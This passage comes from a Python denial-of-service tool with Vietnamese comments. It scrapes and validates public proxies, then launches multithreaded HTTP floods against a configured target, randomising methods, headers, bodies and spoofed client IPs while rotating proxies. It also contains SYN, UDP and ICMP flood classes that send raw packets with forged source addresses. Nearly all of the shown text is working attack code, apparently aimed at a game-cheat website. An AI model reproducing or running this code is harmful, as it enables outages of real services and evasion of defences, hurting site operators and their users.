    # Boolean
    "true", "false", "1", "0", "yes", "no", "on", "off",
    # Special characters
    "!@#$%^&*()_+-=[]{}|;':\",./<>?",
    "™£¢∞§¶•ªº–≠œ∑´®†¥¨ˆøπ“‘«åß∂ƒ©˙∆˚¬…æ≈ç√∫˜µ≤≥÷",
]

USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    # Mobile
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    # Bots
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Baiduspider/2.0 (+http://www.baidu.com/search/spider.htm)",
    "YandexBot/3.0 (+http://yandex.com/bots)",
    "facebookexternalhit/1.1",
    "Twitterbot/1.0",
    "DuckDuckBot/1.0",
    "Slurp/3.0",
    "ia_archiver",
    "Alexa Crawler",
    "AhrefsBot/7.0",
    "SemrushBot/7",
    # CLI tools
    "curl/7.68.0",
    "Wget/1.20.3 (linux-gnu)",
    "python-requests/2.28.0",
    "Python/3.9 aiohttp/3.8.1",
    "Go-http-client/1.1",
    "Java/1.8.0_201",
    "libwww-perl/6.08",
    "Ruby/2.7.0",
    # Old browsers
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
    # Linux browsers
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Gaming consoles
    "Mozilla/5.0 (PlayStation 4 5.00) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.15.4",
    # Smart TV
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/67.0.3396.99 TV Safari/537.36",
    # Various OS
    "Mozilla/5.0 (CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (FreeBSD; amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (OpenBSD; amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=cheat+game+download",
    "https://www.google.com/search?q=t4x+cheat+gamer",
    "https://www.bing.com/search?q=free+game+cheats",
    "https://www.reddit.com/r/cheats/",
    "https://www.youtube.com/watch?v=cheat_tutorial",
    "https://www.facebook.com/groups/gamecheats/",
    "https://discord.com/channels/gamecheats/",
    "https://t.me/gamecheats",
    "https://www.tiktok.com/@cheatgamer",
    "https://github.com/gamecheats/",
    "https://www.twitch.tv/cheatstream",
    "https://twitter.com/cheatgamer",
    "https://www.instagram.com/cheatgamer/",
    "https://www.pinterest.com/gamecheats/",
    "https://duckduckgo.com/?q=cheat+download",
    "https://www.baidu.com/s?wd=cheat",
    "https://yandex.ru/search/?text=cheat",
    "https://search.yahoo.com/search?p=cheat",
    "",
    "https://www.t4xcheatgamer.x10.mx/",
    "https://www.google.com/search?q=free+dll+download",
    "https://www.bing.com/search?q=game+hack+tool",
    "https://search.yahoo.com/search?p=game+cheat+engine",
    "https://www.ask.com/web?q=cheat+engine+download",
    "https://www.aol.com/search?q=game+cheats+free",
    "https://www.ecosia.org/search?q=free+game+cheats",
]

# ============================================
# HÀM XỬ LÝ CTRL+C
# ============================================
def signal_handler(signum, frame):
    global current_proxy_manager
    print("\n\n[!] ĐÃ NHẬN TÍN HIỆU CTRL+C - ĐANG LƯU TẤT CẢ PROXY LIVE...")
    if current_proxy_manager and current_proxy_manager.live_proxies:
        try:
            # Lưu proxy HTTP
            with open(PROXY_HTTP_FILE, "w") as f:
                for proxy_type, proxy in current_proxy_manager.live_proxies:
                    if 'http' in proxy_type:
                        f.write(f"{proxy}\n")
            # Lưu proxy HTTPS
            with open(PROXY_HTTPS_FILE, "w") as f:
                for proxy_type, proxy in current_proxy_manager.live_proxies:
                    if 'https' in proxy_type:
                        f.write(f"{proxy}\n")
            # Lưu proxy SOCKS4
            with open(PROXY_SOCKS4_FILE, "w") as f:
                for proxy_type, proxy in current_proxy_manager.live_proxies:
                    if 'socks4' in proxy_type:
                        f.write(f"{proxy}\n")
            # Lưu proxy SOCKS5
            with open(PROXY_SOCKS5_FILE, "w") as f:
                for proxy_type, proxy in current_proxy_manager.live_proxies:
                    if 'socks5' in proxy_type:
                        f.write(f"{proxy}\n")
            # Lưu tất cả
            with open(PROXY_LIVE_FILE, "w") as f:
                for _, proxy in current_proxy_manager.live_proxies:
                    f.write(proxy + "\n")
            print(f"[+] ĐÃ LƯU {len(current_proxy_manager.live_proxies)} PROXY LIVE")
        except Exception as e:
            print(f"[-] LỖI KHI LƯU FILE: {str(e)}")
    else:
        print("[-] Không có proxy live nào để lưu")
    print("[!] Đang thoát...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ============================================
# LỚP QUẢN LÝ PROXY NÂNG CẤP
# ============================================
class ProxyManager:
    def __init__(self):
        self.proxy_queue = queue.Queue()
        self.live_proxies = []  # List of (type, proxy)
        self.lock = threading.Lock()
        self.total_scanned = 0
        self.total_live = 0
        self.proxy_types = {
            'http': [],
            'https': [],
            'socks4': [],
            'socks5': []
        }
        
    def fetch_proxies_from_source(self, url):
        """Tải proxy từ một nguồn với xác định loại tự động"""
        proxies = []
        try:
            response = requests.get(url, timeout=30, headers={"User-Agent": random.choice(USER_AGENTS)}, verify=False)
            content = response.text
            
            # Xác định loại proxy dựa trên URL
            proxy_type = 'http'
            if 'socks4' in url.lower():
                proxy_type = 'socks4'
            elif 'socks5' in url.lower():
                proxy_type = 'socks5'
            elif 'https' in url.lower():
                proxy_type = 'https'
            
            # Tìm IP:PORT
            ip_port_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b')
            matches = ip_port_pattern.findall(content)
            
            for match in matches:
                proxies.append((proxy_type, match.strip()))
            
            # Kiểm tra nếu có protocol prefix
            proto_pattern = re.compile(r'(http|https|socks4|socks5)://(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}')
            proto_matches = proto_pattern.findall(content)
            for match in proto_matches:
                proto, ip_port = match.split('://')
                proxies.append((proto, ip_port))
            
            print(f"[+] Đã quét {url}: tìm thấy {len(proxies)} proxy ({proxy_type})")
        except Exception as e:
            print(f"[-] Lỗi khi tải {url}: {str(e)[:100]}")
        return proxies
    
    def scan_all_sources(self):
        """Quét tất cả các nguồn proxy"""
        print("\n" + "="*60)
        print("[*] BẮT ĐẦU QUÉT PROXY TỪ CÁC NGUỒN...")
        print(f"[*] Số nguồn: {len(PROXY_SOURCES)}")
        print("="*60 + "\n")
        
        all_proxies = set()
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    all_proxies.update(result)
                except Exception as e:
                    print(f"[-] Lỗi future: {str(e)[:100]}")
        
        # Lưu proxy thô
        with open(PROXY_FILE, "w") as f:
            for proxy_type, proxy in all_proxies:
                f.write(f"{proxy_type}://{proxy}\n")
        
        print(f"\n[+] TỔNG CỘNG: {len(all_proxies)} proxy thô đã được lưu vào {PROXY_FILE}")
        return list(all_proxies)
    
    def check_proxy(self, proxy_data):
        """Kiểm tra một proxy có hoạt động không"""
        proxy_type, proxy = proxy_data
        proxy_str = f"{proxy_type}://{proxy}" if '://' not in proxy else proxy
        
        # Cấu hình proxy dict
        proxy_dict = {}
        if proxy_type in ['http', 'https']:
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        elif proxy_type in ['socks4', 'socks5']:
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        
        # Kiểm tra với nhiều URL test
        for test_url in TEST_URLS[:3]:  # Chỉ test 3 URL để tăng tốc
            try:
                response = requests.get(
                    test_url,
                    proxies=proxy_dict,
                    timeout=PROXY_CHECK_TIMEOUT,
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    verify=False
                )
                if response.status_code == 200:
                    return True, (proxy_type, proxy)
            except:
                continue
        
        return False, (proxy_type, proxy)
    
    def check_all_proxies(self, proxy_list):
        """Kiểm tra tất cả proxy trong danh sách"""
        global current_proxy_manager
        current_proxy_manager = self
        
        print("\n" + "="*60)
        print(f"[*] BẮT ĐẦU KIỂM TRA {len(proxy_list)} PROXY...")
        print(f"[*] Timeout: {PROXY_CHECK_TIMEOUT}s | Luồng: {PROXY_CHECK_THREADS}")
        print("="*60 + "\n")
        
        live_proxies = []
        self.total_scanned = len(proxy_list)
        checked = 0
        
        with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
            futures = {executor.submit(self.check_proxy, proxy_data): proxy_data for proxy_data in proxy_list}
            for future in as_completed(futures):
                try:
                    is_live, proxy_data = future.result(timeout=PROXY_CHECK_TIMEOUT + 2)
                except:
                    is_live, proxy_data = False, ("unknown", "")
                
                checked += 1
                if is_live:
                    live_proxies.append(proxy_data)
                    with self.lock:
                        self.total_live += 1
                        # Phân loại proxy
                        proxy_type = proxy_data[0]
                        if proxy_type in self.proxy_types:
                            self.proxy_types[proxy_type].append(proxy_data[1])
                
                if checked % 500 == 0 or checked == self.total_scanned:
                    print(f"\r[*] Tiến độ: {checked}/{self.total_scanned} | Live: {self.total_live} | Tỉ lệ: {self.total_live/checked*100:.1f}%", end="")
                
                if checked % SAVE_INTERVAL == 0:
                    self.save_live_proxies(live_proxies)
                    print(f"\n[!] Đã tự động lưu {len(live_proxies)} proxy (checkpoint tại {checked}/{self.total_scanned})")
        
        self.live_proxies = live_proxies
        self.save_live_proxies(live_proxies)
        
        # In thống kê
        print(f"\n\n[+] ĐÃ KIỂM TRA XONG: {len(live_proxies)} proxy live")
        for ptype in ['http', 'https', 'socks4', 'socks5']:
            count = len(self.proxy_types[ptype])
            if count > 0:
                print(f"    - {ptype.upper()}: {count}")
        
        return live_proxies
    
    def save_live_proxies(self, live_proxies):
        """Lưu proxy live vào file"""
        with open(PROXY_LIVE_FILE, "w") as f:
            for _, proxy in live_proxies:
                f.write(proxy + "\n")
        
        # Lưu riêng từng loại
        for ptype in ['http', 'https', 'socks4', 'socks5']:
            filename = f"proxies_{ptype}.txt"
            with open(filename, "w") as f:
                for proxy in self.proxy_types[ptype]:
                    f.write(proxy + "\n")
    
    def get_random_proxy(self, proxy_type=None):
        """Lấy proxy ngẫu nhiên, có thể chỉ định loại"""
        if proxy_type and proxy_type in self.proxy_types and self.proxy_types[proxy_type]:
            proxy = random.choice(self.proxy_types[proxy_type])
            proxy_str = f"{proxy_type}://{proxy}" if '://' not in proxy else proxy
            return {"http": proxy_str, "https": proxy_str}
        
        if not self.live_proxies:
            return None
        
        proxy_type, proxy = random.choice(self.live_proxies)
        proxy_str = f"{proxy_type}://{proxy}" if '://' not in proxy else proxy
        return {"http": proxy_str, "https": proxy_str}
    
    def get_proxy_for_type(self, proxy_type):
        """Lấy proxy theo loại cụ thể"""
        if proxy_type in self.proxy_types and self.proxy_types[proxy_type]:
            proxy = random.choice(self.proxy_types[proxy_type])
            proxy_str = f"{proxy_type}://{proxy}" if '://' not in proxy else proxy
            return {"http": proxy_str, "https": proxy_str}
        return self.get_random_proxy()
    
    def reload_live_proxies(self):
        """Tải lại proxy live từ file"""
        if os.path.exists(PROXY_LIVE_FILE):
            with open(PROXY_LIVE_FILE, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            
            self.live_proxies = []
            for proxy in proxies:
                # Xác định loại proxy
                proxy_type = 'http'
                if 'socks4' in proxy:
                    proxy_type = 'socks4'
                elif 'socks5' in proxy:
                    proxy_type = 'socks5'
                elif 'https' in proxy:
                    proxy_type = 'https'
                
                # Xóa protocol prefix nếu có
                clean_proxy = proxy.replace('http://', '').replace('https://', '').replace('socks4://', '').replace('socks5://', '')
                self.live_proxies.append((proxy_type, clean_proxy))
                if proxy_type in self.proxy_types:
                    self.proxy_types[proxy_type].append(clean_proxy)
            
            print(f"[+] Đã tải {len(self.live_proxies)} proxy live từ file")
            return self.live_proxies
        return []

# ============================================
# LỚP SIÊU TẤN CÔNG ĐA METHOD (NÂNG CẤP)
# ============================================
class UltraDDoSAttack:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.total_requests = 0
        self.total_success = 0
        self.total_fail = 0
        self.lock = threading.Lock()
        self.running = False
        self.session_pool = queue.Queue()
        for _ in range(100):
            session = requests.Session()
            session.verify = False
            self.session_pool.put(session)
    
    def get_session(self):
        """Lấy session từ pool hoặc tạo mới"""
        try:
            return self.session_pool.get_nowait()
        except:
            session = requests.Session()
            session.verify = False
            return session
    
    def return_session(self, session):
        """Trả session về pool"""
        try:
            self.session_pool.put_nowait(session)
        except:
            session.close()
    
    def generate_random_url(self):
        """Tạo URL ngẫu nhiên cực kỳ đa dạng"""
        # Chọn base URL
        if random.random() < 0.3:
            base_url = f"https://{TARGET_HOST}{random.choice(TARGET_PATHS)}"
        elif random.random() < 0.6:
            base_url = random.choice(TARGET_URLS)
        else:
            # Tạo URL mới hoàn toàn
            base_url = f"https://{TARGET_HOST}/{'/'.join(random.choices(string.ascii_lowercase, k=random.randint(1, 5)))}"
        
        # Thêm query params
        if random.random() < 0.8:
            num_params = random.randint(1, 20)
            params = []
            for _ in range(num_params):
                key = random.choice(QUERY_PARAMS_POOL)
                if random.random() < 0.2:
                    value = random.choice(PAYLOADS)
                elif random.random() < 0.5:
                    value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 200)))
                else:
                    value = str(random.randint(0, 999999999))
                params.append(f"{key}={value}")
            
            if '?' in base_url:
                base_url += "&" + "&".join(params)
            else:
                base_url += "?" + "&".join(params)
        
        # Thêm fragment
        if random.random() < 0.1:
            base_url += "#" + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 50)))
        
        return base_url
    
    def generate_ultra_headers(self):
        """Tạo HTTP headers siêu ngẫu nhiên và đa dạng"""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json,text/html,*/*",
                "text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5",
                "*/*",
                "application/xml,text/xml,application/json",
                "text/css,*/*;q=0.1",
                "image/webp,image/apng,image/*,*/*;q=0.8",
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8",
                "en-GB,en;q=0.9", "fr-FR,fr;q=0.9",
                "zh-CN,zh;q=0.9", "ru-RU,ru;q=0.9",
                "de-DE,de;q=0.9", "ja-JP,ja;q=0.9",
                "ko-KR,ko;q=0.9", "es-ES,es;q=0.9",
                "*"
            ]),
            "Accept-Encoding": random.choice([
                "gzip, deflate, br",
                "gzip, deflate",
                "identity",
                "br, gzip, deflate",
                "*"
            ]),
            "Referer": random.choice(REFERERS),
            "Connection": random.choice([
                "keep-alive", "close", "Keep-Alive",
                "keep-alive, Upgrade",
                "upgrade"
            ]),
            "Cache-Control": random.choice([
                "no-cache", "max-age=0", "no-store",
                "must-revalidate", "proxy-revalidate",
                "no-cache, no-store, must-revalidate",
                "private, no-cache, no-store, must-revalidate"
            ]),
            "Pragma": random.choice(["no-cache", "no-cache"]),
        }
        
        # Thêm các header IP giả mạo
        if random.random() < 0.5:
            fake_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            headers["X-Forwarded-For"] = fake_ip
            headers["X-Real-IP"] = fake_ip
            headers["X-Client-IP"] = fake_ip
        
        if random.random() < 0.3:
            headers["X-Forwarded-Host"] = random.choice([TARGET_HOST, "google.com", "localhost", "127.0.0.1"])
        
        if random.random() < 0.3:
            headers["Content-Type"] = random.choice(CONTENT_TYPES)
        
        if random.random() < 0.2:
            headers["Origin"] = f"https://{TARGET_HOST}"
        
        # Thêm header bảo mật
        headers["DNT"] = random.choice(["1", "0"])
        headers["Upgrade-Insecure-Requests"] = random.choice(["1", "0"])
        
        if random.random() < 0.3:
            headers["Sec-Fetch-Dest"] = random.choice(["document", "empty", "frame", "iframe", "image", "script", "style"])
            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors", "same-origin"])
            headers["Sec-Fetch-Site"] = random.choice(["cross-site", "same-origin", "none"])
        
        # Thêm header rác ngẫu nhiên
        if random.random() < 0.3:
            for _ in range(random.randint(1, 5)):
                key = f"X-Random-{random.randint(1, 99999)}"
                value = os.urandom(random.randint(10, 100)).hex()
                headers[key] = value
        
        return headers
    
    def generate_random_body(self):
        """Tạo body request siêu ngẫu nhiên"""
        if random.random() < 0.3:
            return None
        
        body_type = random.choice(["urlencoded", "json", "multipart", "xml", "raw", "graphql"])
        
        if body_type == "urlencoded":
            params = {}
            for _ in range(random.randint(1, 20)):
                params[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
            return urlencode(params)
        elif body_type == "json":
            data = {}
            for _ in range(random.randint(1, 10)):
                data[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
            return json.dumps(data)
        elif body_type == "xml":
            return '<?xml version="1.0"?><root>' + ''.join([
                f'<{random.choice(QUERY_PARAMS_POOL)}>{random.choice(PAYLOADS)}</{random.choice(QUERY_PARAMS_POOL)}>'
                for _ in range(random.randint(1, 10))
            ]) + '</root>'
        elif body_type == "multipart":
            boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            parts = []
            for _ in range(random.randint(1, 5)):
                parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{random.choice(QUERY_PARAMS_POOL)}\"\r\n\r\n{random.choice(PAYLOADS)}\r\n")
            parts.append(f"--{boundary}--\r\n")
            return "\r\n".join(parts)
        elif body_type == "graphql":
            return json.dumps({
                "query": "query { " + random.choice(QUERY_PARAMS_POOL) + " { " + random.choice(QUERY_PARAMS_POOL) + " } }",
                "variables": {random.choice(QUERY_PARAMS_POOL): random.choice(PAYLOADS)}
            })
        else:
            return os.urandom(random.randint(1024, 1024*1024))
    
    def send_mega_request(self, thread_id):
        """Gửi request siêu ngẫu nhiên với method bất kỳ"""
        session = self.get_session()
        request_counter = 0
        
        while self.running:
            try:
                if request_counter % ROTATE_PROXY_EVERY == 0:
                    proxy = self.proxy_manager.get_random_proxy()
                
                url = self.generate_random_url()
                method = random.choice(HTTP_METHODS)
                headers = self.generate_ultra_headers()
                body = self.generate_random_body()
                
                # Thêm jitter để tránh pattern
                time.sleep(random.uniform(0, 0.001))
                
                if method in ["GET", "HEAD", "OPTIONS", "DELETE", "TRACE"]:
                    response = session.request(method, url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
                else:
                    response = session.request(method, url, headers=headers, data=body, proxies=proxy, timeout=30, verify=False, stream=True)
                
                # Đọc một phần response
                try:
                    chunk = response.content[:4096]
                except:
                    pass
                
                with self.lock:
                    self.total_requests += 1
                    self.total_success += 1
                    if self.total_requests % 1000 == 0:
                        print(f"\r[*] ULTRA ATTACK: {self.total_requests} requests | Success: {self.total_success} | Fail: {self.total_fail}", end="")
                
                request_counter += 1
            except Exception as e:
                with self.lock:
                    self.total_fail += 1
                    self.total_requests += 1
                request_counter += 1
                continue
        
        self.return_session(session)
    
    def start_mega_attack(self, num_threads=RANDOM_METHOD_THREADS):
        """Bắt đầu siêu tấn công đa method"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU SIÊU TẤN CÔNG ĐA METHOD VỚI {num_threads} LUỒNG...")
        print(f"[*] {len(HTTP_METHODS)} HTTP Methods | {len(CONTENT_TYPES)} Content-Types | {len(PAYLOADS)} Payloads")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_mega_request, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.001)
        
        return threads
    
    def stop_attack(self):
        """Dừng tấn công"""
        self.running = False

# ============================================
# LỚP SYN FLOOD (TCP SYN Flood)
# ============================================
class SYNFlood:
    def __init__(self):
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def send_syn_packet(self, target_ip, target_port):
        """Gửi gói SYN sử dụng raw socket"""
        try:
            # Tạo IP header
            ip = IP(
                src=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                dst=target_ip
            )
            
            # Tạo TCP SYN packet
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags="S",
                seq=random.randint(0, 4294967295),
                window=random.randint(1024, 65535)
            )
            
            # Tạo packet
            packet = ip/tcp
            
            # Gửi packet ở layer 3
            scapy.send(packet, verbose=0, iface=None)
            return True
        except Exception as e:
            return False
    
    def syn_flood_worker(self, thread_id, target_ip, target_port):
        """Worker gửi SYN flood"""
        while self.running:
            try:
                if self.send_syn_packet(target_ip, target_port):
                    with self.lock:
                        self.packets_sent += 1
                        if self.packets_sent % 10000 == 0:
                            print(f"\r[*] SYN Flood: {self.packets_sent} packets sent", end="")
            except:
                pass
    
    def start_flood(self, num_threads=SYN_FLOOD_THREADS, target_ip=None, target_port=None):
        """Bắt đầu SYN flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        if target_port is None:
            target_port = TARGET_HTTPS_PORT
        
        if target_ip is None:
            print("[-] Không thể bắt đầu SYN Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU SYN FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{target_port}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.syn_flood_worker, args=(i, target_ip, target_port))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng SYN flood"""
        self.running = False
        print(f"\n[!] SYN Flood đã gửi tổng cộng {self.packets_sent} packets")

# ============================================
# LỚP UDP FLOOD
# ============================================
class UDPFlood:
    def __init__(self):
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.sockets = []
    
    def create_udp_socket(self):
        """Tạo UDP socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            return sock
        except:
            return None
    
    def udp_flood_worker(self, thread_id, target_ip, target_port):
        """Worker gửi UDP flood"""
        sock = self.create_udp_socket()
        if sock is None:
            return
        
        self.sockets.append(sock)
        payload_size = random.randint(64, 65507)  # Kích thước tối đa UDP
        payload = os.urandom(payload_size)
        
        while self.running:
            try:
                # Gửi UDP packet với địa chỉ IP nguồn giả mạo (nếu có thể)
                sock.sendto(payload, (target_ip, target_port))
                with self.lock:
                    self.packets_sent += 1
                    if self.packets_sent % 10000 == 0:
                        print(f"\r[*] UDP Flood: {self.packets_sent} packets sent", end="")
                
                # Thay đổi payload
                if random.random() < 0.1:
                    payload = os.urandom(random.randint(64, 65507))
            except:
                pass
            time.sleep(0.0001)
        
        try:
            sock.close()
        except:
            pass
    
    def start_flood(self, num_threads=UDP_FLOOD_THREADS, target_ip=None, target_port=None):
        """Bắt đầu UDP flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        if target_port is None:
            target_port = random.choice([53, 80, 443, 8080, 8443])
        
        if target_ip is None:
            print("[-] Không thể bắt đầu UDP Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU UDP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{target_port}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.udp_flood_worker, args=(i, target_ip, target_port))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 200 == 0:
                time.sleep(0.001)
        
        return threads
    
    def stop_flood(self):
        """Dừng UDP flood"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        print(f"\n[!] UDP Flood đã gửi tổng cộng {self.packets_sent} packets")

# ============================================
# LỚP ICMP FLOOD (Ping Flood)
# ============================================
class ICMPFlood:
    def __init__(self):
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def icmp_flood_worker(self, thread_id, target_ip):
        """Worker gửi ICMP flood"""
        try:
            # Tạo raw socket cho ICMP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            # Fallback: sử dụng ICMP packet từ scapy
            sock = None
        
        while self.running:
            try:
                if sock:
                    # Tạo ICMP echo request
                    packet_id = random.randint(0, 65535)
                    seq = random.randint(0, 65535)
                    payload = os.urandom(random.randint(32, 1472))
                    
                    # ICMP header
                    icmp_type = 8  # Echo request
                    icmp_code = 0
                    icmp_checksum = 0
                    
                    # Tạo ICMP packet
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, seq)
                    icmp_packet = icmp_header + payload
                    
                    # Tính checksum
                    icmp_checksum = self._checksum(icmp_packet)
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, seq)
                    icmp_packet = icmp_header + payload
                    
                    sock.sendto(icmp_packet, (target_ip, 0))
                else:
                    # Dùng scapy
                    scapy.send(scapy.IP(dst=target_ip)/scapy.ICMP()/os.urandom(random.randint(32, 1472)), verbose=0)
                
                with self.lock:
                    self.packets_sent += 1
                    if self.packets_sent % 10000 == 0:
                        print(f"\r[*] ICMP Flood: {self.packets_sent} packets sent", end="")
            except:
                pass
            time.sleep(0.0001)
    
    def _checksum(self, data):
        """Tính ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    def start_flood(self, num_threads=ICMP_FLOOD_THREADS, target_ip=None):
        """Bắt đầu ICMP flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        
        if target_ip is None:
            print("[-] Không thể bắt đầu ICMP Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU ICMP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.icmp_flood_worker, args=(i, target_ip))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng ICMP flood"""
        self.running = False
        print(f"\n[!] ICMP Flood đã gửi tổng cộng {self.packets_sent} packets")

# ============================================
